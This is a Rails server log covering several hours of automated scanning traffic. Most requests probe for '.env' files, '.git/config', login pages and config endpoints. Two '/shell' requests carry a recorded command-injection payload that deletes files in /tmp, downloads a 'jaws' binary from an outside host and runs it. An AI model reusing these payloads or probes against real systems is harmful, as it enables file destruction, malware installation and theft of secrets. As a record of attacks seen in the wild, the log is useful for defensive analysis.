# Logfile created on 2023-03-09 00:29:56 +0900 by logger.rb/v1.5.0
I, [2023-03-09T00:29:56.810478 #2274955]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-03-09 00:29:56 +0900
I, [2023-03-09T00:29:56.811372 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T00:29:56.811419 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T00:29:56.811891 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T00:29:56.812502 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T00:29:56.812667 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T00:29:57.398113 #2274955]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-03-09 00:29:57 +0900
F, [2023-03-09T00:29:57.398466 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T00:37:06.879783 #2274953]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 00:37:06 +0900
I, [2023-03-09T00:37:06.880495 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T00:37:06.880534 #2274953]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T00:37:06.881453 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T00:37:06.882402 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-09T00:37:06.882747 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.5ms | Allocations: 505)
I, [2023-03-09T00:56:50.199271 #2274953]  INFO -- : Started GET "/api/index.php/v1/config/application?public=true" for 3.15.172.157 at 2023-03-09 00:56:50 +0900
I, [2023-03-09T00:56:50.200348 #2274953]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T00:56:50.200400 #2274953]  INFO -- :   Parameters: {"public"=>"true", "all"=>"api/index.php/v1/config/application"}
I, [2023-03-09T00:56:50.201428 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T00:56:50.204339 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 3.0ms | Allocations: 298)
I, [2023-03-09T00:56:50.204530 #2274953]  INFO -- : Completed 200 OK in 4ms (Views: 3.8ms | Allocations: 511)
I, [2023-03-09T01:34:25.972592 #2274953]  INFO -- : Started GET "/" for 94.102.51.9 at 2023-03-09 01:34:25 +0900
I, [2023-03-09T01:34:25.973226 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T01:34:25.973658 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T01:34:25.974276 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T01:34:25.974443 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 521)
I, [2023-03-09T01:39:29.947230 #2274953]  INFO -- : Started GET "/" for 139.162.84.205 at 2023-03-09 01:39:29 +0900
I, [2023-03-09T01:39:29.947824 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T01:39:29.948255 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T01:39:29.948937 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T01:39:29.949112 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T01:50:52.995562 #2274953]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+update.rawupdater.cf/jaws;sh+/tmp/jaws" for 190.83.104.7 at 2023-03-09 01:50:52 +0900
I, [2023-03-09T01:50:52.996230 #2274953]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T01:50:52.996277 #2274953]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget update.rawupdater.cf/jaws"=>nil, "sh /tmp/jaws"=>nil, "all"=>"shell"}
I, [2023-03-09T01:50:52.996799 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T01:50:52.997466 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T01:50:52.997641 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 513)
I, [2023-03-09T01:51:32.075879 #2274953]  INFO -- : Started GET "/shell?cd+/tmp;rm+-rf+*;wget+45.77.243.49/jaws;sh+/tmp/jaws" for 103.173.157.203 at 2023-03-09 01:51:32 +0900
I, [2023-03-09T01:51:32.076734 #2274953]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T01:51:32.076871 #2274953]  INFO -- :   Parameters: {"cd /tmp"=>nil, "rm -rf *"=>nil, "wget 45.77.243.49/jaws"=>nil, "sh /tmp/jaws"=>nil, "all"=>"shell"}
I, [2023-03-09T01:51:32.077402 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T01:51:32.078938 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.6ms | Allocations: 299)
I, [2023-03-09T01:51:32.079125 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.9ms | Allocations: 513)
I, [2023-03-09T01:55:03.302786 #2274953]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 01:55:03 +0900
I, [2023-03-09T01:55:03.303404 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T01:55:03.303446 #2274953]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T01:55:03.304014 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T01:55:03.304655 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T01:55:03.304805 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 505)
I, [2023-03-09T02:00:31.397153 #2274953]  INFO -- : Started GET "/" for 94.102.51.9 at 2023-03-09 02:00:31 +0900
I, [2023-03-09T02:00:31.397761 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T02:00:31.398271 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T02:00:31.398906 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T02:00:31.399076 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T02:04:49.351949 #2274953]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-03-09 02:04:49 +0900
I, [2023-03-09T02:04:49.352836 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T02:04:49.352920 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T02:04:49.353542 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T02:04:49.354222 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T02:04:49.356740 #2274953]  INFO -- : Completed 200 OK in 4ms (Views: 1.0ms | Allocations: 522)
I, [2023-03-09T02:04:50.690599 #2274955]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-03-09 02:04:50 +0900
F, [2023-03-09T02:04:50.690932 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T02:10:03.413904 #2274955]  INFO -- : Started GET "/" for 94.102.51.9 at 2023-03-09 02:10:03 +0900
I, [2023-03-09T02:10:03.414629 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T02:10:03.415075 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T02:10:03.415940 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-09T02:10:03.416125 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-09T02:17:11.508336 #2274955]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-03-09 02:17:11 +0900
I, [2023-03-09T02:17:11.509012 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T02:17:11.509057 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T02:17:11.509483 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T02:17:11.510135 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T02:17:11.510439 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T02:17:12.048310 #2274953]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-03-09 02:17:12 +0900
F, [2023-03-09T02:17:12.049551 #2274953] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T02:41:20.872829 #2274953]  INFO -- : Started GET "/" for 45.228.255.40 at 2023-03-09 02:41:20 +0900
I, [2023-03-09T02:41:20.873438 #2274953]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T02:41:20.873862 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T02:41:20.874485 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T02:41:20.874633 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 513)
I, [2023-03-09T03:04:44.818654 #2274955]  INFO -- : Started GET "/" for 94.102.51.9 at 2023-03-09 03:04:44 +0900
I, [2023-03-09T03:04:44.819394 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T03:04:44.819859 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T03:04:44.820831 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-09T03:04:44.821100 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-03-09T03:12:15.432842 #2274955]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 03:12:15 +0900
I, [2023-03-09T03:12:15.433489 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T03:12:15.433530 #2274955]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T03:12:15.433971 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T03:12:15.434677 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T03:12:15.434825 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 505)
I, [2023-03-09T04:07:58.276175 #2274955]  INFO -- : Started GET "/" for 134.122.14.77 at 2023-03-09 04:07:58 +0900
I, [2023-03-09T04:07:58.276855 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T04:07:58.277338 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T04:07:58.278063 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T04:07:58.278241 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 521)
I, [2023-03-09T04:09:07.551135 #2274955]  INFO -- : Started GET "/" for 134.122.14.77 at 2023-03-09 04:09:07 +0900
I, [2023-03-09T04:09:07.551867 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T04:09:07.552321 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T04:09:07.554048 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.8ms | Allocations: 299)
I, [2023-03-09T04:09:07.555233 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 2.2ms | Allocations: 521)
I, [2023-03-09T04:30:14.782336 #2274955]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 04:30:14 +0900
I, [2023-03-09T04:30:14.783102 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T04:30:14.783357 #2274955]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T04:30:14.783812 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T04:30:14.784434 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T04:30:14.784579 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 0.9ms | Allocations: 505)
I, [2023-03-09T04:35:55.794064 #2274955]  INFO -- : Started GET "/.git/config" for 157.245.97.198 at 2023-03-09 04:35:55 +0900
I, [2023-03-09T04:35:55.795001 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T04:35:55.795044 #2274955]  INFO -- :   Parameters: {"all"=>".git/config"}
I, [2023-03-09T04:35:55.795617 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T04:35:55.796269 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T04:35:55.796693 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-03-09T04:42:28.275211 #2274955]  INFO -- : Started GET "/" for 198.98.58.152 at 2023-03-09 04:42:28 +0900
I, [2023-03-09T04:42:28.275798 #2274955]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T04:42:28.276213 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T04:42:28.276821 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.6ms | Allocations: 299)
I, [2023-03-09T04:42:28.277034 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 514)
I, [2023-03-09T04:43:30.519359 #2274955]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-03-09 04:43:30 +0900
I, [2023-03-09T04:43:30.519966 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T04:43:30.520005 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T04:43:30.520586 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T04:43:30.521292 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-09T04:43:30.521476 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-09T04:43:31.094531 #2274955]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-03-09 04:43:31 +0900
F, [2023-03-09T04:43:31.094893 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T04:48:08.017613 #2274953]  INFO -- : Started GET "/" for 162.142.125.217 at 2023-03-09 04:48:08 +0900
I, [2023-03-09T04:48:08.018191 #2274953]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T04:48:08.018606 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T04:48:08.019454 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 298)
I, [2023-03-09T04:48:08.019615 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.2ms | Allocations: 512)
I, [2023-03-09T04:48:08.272862 #2274953]  INFO -- : Started GET "/" for 162.142.125.217 at 2023-03-09 04:48:08 +0900
I, [2023-03-09T04:48:08.273499 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T04:48:08.273939 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T04:48:08.274656 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-03-09T04:48:08.274831 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.1ms | Allocations: 515)
I, [2023-03-09T05:29:49.311193 #2274955]  INFO -- : Started GET "/.env" for 109.237.98.226 at 2023-03-09 05:29:49 +0900
I, [2023-03-09T05:29:49.311865 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T05:29:49.311908 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T05:29:49.312442 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T05:29:49.315387 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 3.0ms | Allocations: 299)
I, [2023-03-09T05:29:49.315584 #2274955]  INFO -- : Completed 200 OK in 4ms (Views: 3.3ms | Allocations: 521)
I, [2023-03-09T05:51:30.295284 #2274955]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 05:51:30 +0900
I, [2023-03-09T05:51:30.295965 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T05:51:30.296066 #2274955]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T05:51:30.296626 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T05:51:30.297485 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-09T05:51:30.297644 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 505)
I, [2023-03-09T06:13:45.224116 #2274955]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-03-09 06:13:45 +0900
I, [2023-03-09T06:13:45.224745 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T06:13:45.224784 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T06:13:45.225276 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T06:13:45.226073 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 299)
I, [2023-03-09T06:13:45.226550 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 521)
I, [2023-03-09T06:13:46.500774 #2274955]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-03-09 06:13:46 +0900
F, [2023-03-09T06:13:46.501256 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T06:18:11.510734 #2274953]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-03-09 06:18:11 +0900
I, [2023-03-09T06:18:11.511975 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T06:18:11.512020 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T06:18:11.512459 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T06:18:11.513120 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T06:18:11.513291 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T06:18:12.035124 #2274955]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-03-09 06:18:12 +0900
F, [2023-03-09T06:18:12.035706 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T06:34:24.316968 #2274955]  INFO -- : Started GET "/" for 109.111.143.11 at 2023-03-09 06:34:24 +0900
I, [2023-03-09T06:34:24.317575 #2274955]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T06:34:24.318075 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T06:34:24.318715 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T06:34:24.318865 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 513)
I, [2023-03-09T06:55:08.773721 #2274955]  INFO -- : Started GET "/" for 94.102.51.9 at 2023-03-09 06:55:08 +0900
I, [2023-03-09T06:55:08.774403 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T06:55:08.774859 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T06:55:08.776129 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.3ms | Allocations: 299)
I, [2023-03-09T06:55:08.776716 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 2.0ms | Allocations: 521)
I, [2023-03-09T07:03:59.845592 #2274955]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-03-09 07:03:59 +0900
I, [2023-03-09T07:03:59.846424 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T07:03:59.846472 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T07:03:59.846947 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T07:03:59.847592 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T07:03:59.847766 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T07:04:01.039567 #2274953]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-03-09 07:04:01 +0900
F, [2023-03-09T07:04:01.039915 #2274953] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T07:08:28.566582 #2274955]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 07:08:28 +0900
I, [2023-03-09T07:08:28.567184 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T07:08:28.567223 #2274955]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T07:08:28.567873 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T07:08:28.568485 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T07:08:28.568619 #2274955]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 505)
I, [2023-03-09T07:15:12.495424 #2274955]  INFO -- : Started GET "/.env" for 18.220.13.159 at 2023-03-09 07:15:12 +0900
I, [2023-03-09T07:15:12.496312 #2274955]  INFO -- : Processing by UserController#index as HTML
I, [2023-03-09T07:15:12.497275 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T07:15:12.497902 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T07:15:12.498698 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.8ms | Allocations: 298)
I, [2023-03-09T07:15:12.498921 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.2ms | Allocations: 511)
I, [2023-03-09T07:49:25.524174 #2274955]  INFO -- : Started GET "/" for 104.248.203.191 at 2023-03-09 07:49:25 +0900
I, [2023-03-09T07:49:25.524789 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T07:49:25.525480 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T07:49:25.526364 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.9ms | Allocations: 299)
I, [2023-03-09T07:49:25.526620 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-03-09T07:49:59.790016 #2274955]  INFO -- : Started GET "/.env" for 95.214.235.205 at 2023-03-09 07:49:59 +0900
I, [2023-03-09T07:49:59.790701 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T07:49:59.790745 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T07:49:59.791490 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.1ms | Allocations: 4)
I, [2023-03-09T07:49:59.792252 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.1ms | Allocations: 299)
I, [2023-03-09T07:49:59.792439 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 521)
I, [2023-03-09T07:50:00.425935 #2274955]  INFO -- : Started POST "/" for 95.214.235.205 at 2023-03-09 07:50:00 +0900
F, [2023-03-09T07:50:00.426356 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T08:14:31.443093 #2274953]  INFO -- : Started GET "/" for 167.94.138.49 at 2023-03-09 08:14:31 +0900
I, [2023-03-09T08:14:31.443678 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T08:14:31.444106 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T08:14:31.445467 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.4ms | Allocations: 299)
I, [2023-03-09T08:14:31.445704 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.7ms | Allocations: 521)
I, [2023-03-09T08:25:26.487702 #2274953]  INFO -- : Started HEAD "/Core/Skin/Login.aspx" for 101.32.209.199 at 2023-03-09 08:25:26 +0900
I, [2023-03-09T08:25:26.488340 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T08:25:26.488384 #2274953]  INFO -- :   Parameters: {"all"=>"Core/Skin/Login"}
I, [2023-03-09T08:25:26.488981 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T08:25:26.489900 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-09T08:25:26.490050 #2274953]  INFO -- : Completed 200 OK in 2ms (Views: 1.4ms | Allocations: 505)
I, [2023-03-09T08:41:56.047881 #2274953]  INFO -- : Started GET "/.env" for 135.125.244.48 at 2023-03-09 08:41:56 +0900
I, [2023-03-09T08:41:56.048526 #2274953]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T08:41:56.048565 #2274953]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T08:41:56.049070 #2274953]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T08:41:56.049724 #2274953]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 0.7ms | Allocations: 299)
I, [2023-03-09T08:41:56.049888 #2274953]  INFO -- : Completed 200 OK in 1ms (Views: 1.0ms | Allocations: 521)
I, [2023-03-09T08:41:56.571139 #2274955]  INFO -- : Started POST "/" for 135.125.244.48 at 2023-03-09 08:41:56 +0900
F, [2023-03-09T08:41:56.571478 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T09:03:31.435988 #2274955]  INFO -- : Started GET "/.env" for 185.254.196.115 at 2023-03-09 09:03:31 +0900
I, [2023-03-09T09:03:31.436631 #2274955]  INFO -- : Processing by UserController#index as */*
I, [2023-03-09T09:03:31.436757 #2274955]  INFO -- :   Parameters: {"all"=>".env"}
I, [2023-03-09T09:03:31.437244 #2274955]  INFO -- :   Rendered user/index.html.erb within layouts/application (Duration: 0.0ms | Allocations: 4)
I, [2023-03-09T09:03:31.438206 #2274955]  INFO -- :   Rendered layout layouts/application.html.erb (Duration: 1.0ms | Allocations: 299)
I, [2023-03-09T09:03:31.438390 #2274955]  INFO -- : Completed 200 OK in 2ms (Views: 1.3ms | Allocations: 521)
I, [2023-03-09T09:03:33.542489 #2274955]  INFO -- : Started POST "/" for 185.254.196.115 at 2023-03-09 09:03:33 +0900
F, [2023-03-09T09:03:33.542826 #2274955] FATAL -- :   
ActionController::RoutingError (No route matches [POST] "/"):
  
I, [2023-03-09T09:33:29.942835 #2274953]  INFO -- : Started GET "/" for 193.32.162.159 at 2023-03-09 09:33:29 +0900
I, [2023-03-09T09:33:29.943487 #2274953]  INFO -- : Processing by UserController#index as */*
